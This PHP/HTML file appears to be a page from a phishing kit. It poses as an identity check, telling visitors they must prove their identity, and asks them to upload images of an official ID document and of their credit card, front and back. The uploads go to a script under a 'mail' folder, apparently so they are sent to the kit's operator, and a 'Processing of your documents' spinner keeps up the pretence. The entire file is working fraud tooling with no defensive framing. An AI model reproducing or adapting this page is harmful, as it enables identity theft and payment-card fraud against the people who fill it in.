<?php


 require "../../slekek/func.php";
 require "../../slekek/acc.php";

?>

<!DOCTYPE html>
<html>

<body>

<script type="text/javascript" src="identity/ds/jquery.min.js"></script>
    <script type="text/javascript">
        $("body").on("click", "#btnUpload", function () {
            var allowedFiles = [".jpg" , ".heif" , ".hevc" , ".png" , ".gif", ".jpeg" , ".bmp"];
            var fileUpload = $("#file_input");
            var lblError = $("#lblError1");
            var regex = new RegExp("([0-9a-zA-Z\-_ ’'‘ÆÐƎƏƐƔĲŊŒẞÞǷȜæðǝəɛɣĳŋœĸſßþƿȝĄƁÇĐƊĘĦĮƘŁØƠŞȘŢȚŦŲƯY̨Ƴąɓçđɗęħįƙłøơşșţțŧųưy̨ƴÁÀÂÄǍĂĀÃÅǺĄÆǼǢƁĆĊĈČÇĎḌĐƊÐÉÈĖÊËĚĔĒĘẸƎƏƐĠĜǦĞĢƔáàâäǎăāãåǻąæǽǣɓćċĉčçďḍđɗðéèėêëěĕēęẹǝəɛġĝǧğģɣĤḤĦIÍÌİÎÏǏĬĪĨĮỊĲĴĶƘĹĻŁĽĿʼNŃN̈ŇÑŅŊÓÒÔÖǑŎŌÕŐỌØǾƠŒĥḥħıíìiîïǐĭīĩįịĳĵķƙĸĺļłľŀŉńn̈ňñņŋóòôöǒŏōõőọøǿơœŔŘŖŚŜŠŞȘṢẞŤŢṬŦÞÚÙÛÜǓŬŪŨŰŮŲỤƯẂẀŴẄǷÝỲŶŸȲỸƳŹŻŽẒŕřŗſśŝšşșṣßťţṭŧþúùûüǔŭūũűůųụưẃẁŵẅƿýỳŷÿȳỹƴźżžẓ()])+(" + allowedFiles.join('|') + ")$");
            if (!regex.test(fileUpload.val().toLowerCase())) {
                lblError.html("Attach copy of the official document" );
                return false;
            }
            lblError.html('');
            return true;
        });
    </script>    
          <script type="text/javascript">
        $("body").on("click", "#btnUpload", function () {
            var allowedFiles = [".jpg" , ".heif" , ".hevc" , ".png" , ".gif", ".jpeg" , ".bmp"];
            var fileUpload = $("#file_input2");
            var lblError = $("#lblError2");
            var regex = new RegExp("([0-9a-zA-Z\-_ ’'‘ÆÐƎƏƐƔĲŊŒẞÞǷȜæðǝəɛɣĳŋœĸſßþƿȝĄƁÇĐƊĘĦĮƘŁØƠŞȘŢȚŦŲƯY̨Ƴąɓçđɗęħįƙłøơşșţțŧųưy̨ƴÁÀÂÄǍĂĀÃÅǺĄÆǼǢƁĆĊĈČÇĎḌĐƊÐÉÈĖÊËĚĔĒĘẸƎƏƐĠĜǦĞĢƔáàâäǎăāãåǻąæǽǣɓćċĉčçďḍđɗðéèėêëěĕēęẹǝəɛġĝǧğģɣĤḤĦIÍÌİÎÏǏĬĪĨĮỊĲĴĶƘĹĻŁĽĿʼNŃN̈ŇÑŅŊÓÒÔÖǑŎŌÕŐỌØǾƠŒĥḥħıíìiîïǐĭīĩįịĳĵķƙĸĺļłľŀŉńn̈ňñņŋóòôöǒŏōõőọøǿơœŔŘŖŚŜŠŞȘṢẞŤŢṬŦÞÚÙÛÜǓŬŪŨŰŮŲỤƯẂẀŴẄǷÝỲŶŸȲỸƳŹŻŽẒŕřŗſśŝšşșṣßťţṭŧþúùûüǔŭūũűůųụưẃẁŵẅƿýỳŷÿȳỹƴźżžẓ()])+(" + allowedFiles.join('|') + ")$");
            // if (!regex.test(fileUpload.val().toLowerCase())) {
            //     lblError.html("Attach copy of the Credit Card (front & back)" );
            //     return false;
            // }
            lblError.html('');
            return true;
        });
    </script>
  


				<div id="page-wrap">

						<div id="load" class="transitioning spinner spin" style="display:none;">Processing of your documents...</div>


<main>

	 <form action="ID/identity/mail/identity.php" method="post" enctype="multipart/form-data" onsubmit="return ray.ajax()">






<div id="page-wrap">

	  <font color="#05285c"> <font id="overpanel-header">  You need documents to prove your identity. </font> </font>

	 <div id="column1">

<br>
 <input class="aa"    value="Attach copy of the official document" readonly="readonly" style="width: 280px; height: 40px" />



 <div  style="height: 0px;"> <span id="lblError1" class="message"   ></span>  <span  id="message1" ></span> </div>

<br>
<img style="height: 116px;width: 278px;" src="./ID/identity/images/identity.png" >
 	


  <input type="file" class="file_input" id="file_input" multiple="multiple" name="files[]"     />



</div>

	 <div id="column2">

<br>
				<input class="aaa"    value="Attach copy of the Credit Card" readonly="readonly" style="width: 280px; height: 40px" />


	 <div  style="height: 0px;"> <span id="lblError2" class="message"   ></span>  <span  id="message1" ></span> </div>
<br>
<img style="height: 116px;width: 278px;" src="./ID/identity/images/card.png">
 	

 	<div style="margin: 0.5px"></div>

  <input type="file" class="file_input" id="file_input2" multiple="multiple" name="files[]"     />



</div>

<div id="column3" > 	



<br>
<br>
<br>
<br>
<br>
<br>
<br>
<button class="btn" id="btnUpload"  type="submit" style="left: 0px; top: 0px; width: 297px; margin-left: 50%; " onclick="LoadPage()"><?php echo $_LANG['CONFIRM']; ?>
</button>
</div>


	</form>



</div>

  </div>


 <pre></pre>
</body>
</html>